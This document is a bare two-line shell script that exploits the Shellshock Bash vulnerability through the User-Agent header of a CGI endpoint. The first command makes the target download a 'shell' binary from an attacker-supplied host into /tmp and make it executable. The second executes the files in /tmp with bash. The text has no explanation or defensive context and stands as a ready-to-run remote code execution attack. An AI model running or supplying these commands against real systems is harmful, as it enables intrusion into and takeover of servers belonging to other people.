curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/wget $2/shell -q -O /tmp/shell; /bin/chmod +x /tmp/shell" http://$1/cgi-bin/test.cgi
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash /tmp/*;" http://$1/cgi-bin/test.cgi
